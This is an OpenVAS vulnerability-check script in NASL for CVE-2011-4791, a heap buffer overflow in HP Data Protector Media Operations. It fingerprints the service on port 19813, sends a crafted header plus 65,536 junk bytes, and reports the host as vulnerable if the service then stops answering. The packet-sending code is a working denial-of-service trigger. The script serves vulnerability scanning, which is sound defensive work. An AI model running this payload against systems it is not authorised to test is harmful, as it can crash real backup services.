###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hp_data_protector_media_operations_bof_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# HP Data Protector Media Operations Heap Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802269");
  script_version("$Revision: 11997 $");
  script_cve_id("CVE-2011-4791");
  script_bugtraq_id(47004);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"creation_date", value:"2011-11-08 11:11:11 +0530 (Tue, 08 Nov 2011)");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_name("HP Data Protector Media Operations Heap Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(19813);

  script_xref(name:"URL", value:"https://secunia.com/advisories/46688");
  script_xref(name:"URL", value:"http://zerodayinitiative.com/advisories/ZDI-11-112/");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/hpdpmedia_2-adv.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/106591/hpdpmedia_2-adv.txt");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
  arbitrary code within the context of the application or cause a denial of service condition.");

  script_tag(name:"affected", value:"HP Data Protector Media Operations versions 6.20 and prior.");

  script_tag(name:"insight", value:"The flaw is due to a boundary error when processing large size
  packets. This can be exploited to cause a heap-based buffer overflow via a specially crafted
  packet sent to port 19813.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running HP Data Protector Media Operations and is
  prone to buffer overflow vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

port = 19813; # Default Port
if(!get_port_state(port)){
  exit(0);
}

soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

res = recv(socket:soc, length:512);
if("MediaDB.4DC" >!< res){
  close(soc);
  exit(0);
}

head = raw_string(0x03, 0x00, 0x00, 0x01, 0xff, 0xff, 0xf0, 0x00, 0x01, 0x02,
                  0x03, 0x04, 0x04);
junk = crap(data:"a", length:65536);

send(socket:soc, data:head + junk);
close(soc);

sleep(3);

if(!soc1 =  open_sock_tcp(port)){
  security_message(port);
  exit(0);
}

if(! res = recv(socket:soc1, length:512)){
  security_message(port);
}

close(soc1);
